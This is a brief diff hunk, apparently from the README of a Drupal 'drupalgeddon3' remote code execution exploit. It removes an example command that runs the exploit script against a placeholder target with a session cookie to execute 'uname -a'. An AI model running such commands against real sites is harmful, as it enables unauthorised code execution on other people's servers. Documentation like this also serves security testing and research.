@@ -10,8 +10,6 @@ Which could result in the site being compromised.
 This vulnerability is related to Drupal core - Highly critical - Remote Code Execution
 
 ### Example
-`python drupalgeddon3.py http://target/drupal/ 'SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0' 6 'uname -a'`
-
 <img src='https://i.imgur.com/9qRHfZ7.png'/>
 
 
